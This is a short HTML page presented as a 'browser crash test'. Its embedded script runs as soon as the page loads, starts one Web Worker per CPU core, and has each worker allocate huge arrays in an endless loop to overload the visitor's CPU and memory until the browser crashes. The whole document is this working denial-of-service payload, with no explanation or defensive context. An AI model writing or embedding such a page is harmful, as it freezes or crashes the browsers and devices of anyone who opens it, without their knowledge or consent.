<!DOCTYPE html>

    <title>Browser Crash Test - Multi-Threaded CPU Overload</title>
</head>
<body>
    <h1>Browser Crash Test - Multi-Threaded CPU Overload</h1>
    <p>If your browser crashes, the test was successful.</p>

    <script>
        function startWorker() {
            let code = `
                while (true) {
                    let arr = new Array(1e7).fill(0);
                }
            `;
            let blob = new Blob([code], { type: "application/javascript" });
            let worker = new Worker(URL.createObjectURL(blob));
        }

        for (let i = 0; i < navigator.hardwareConcurrency; i++) {
            startWorker(); // Creates one worker per CPU core
        }
    </script>
</body>
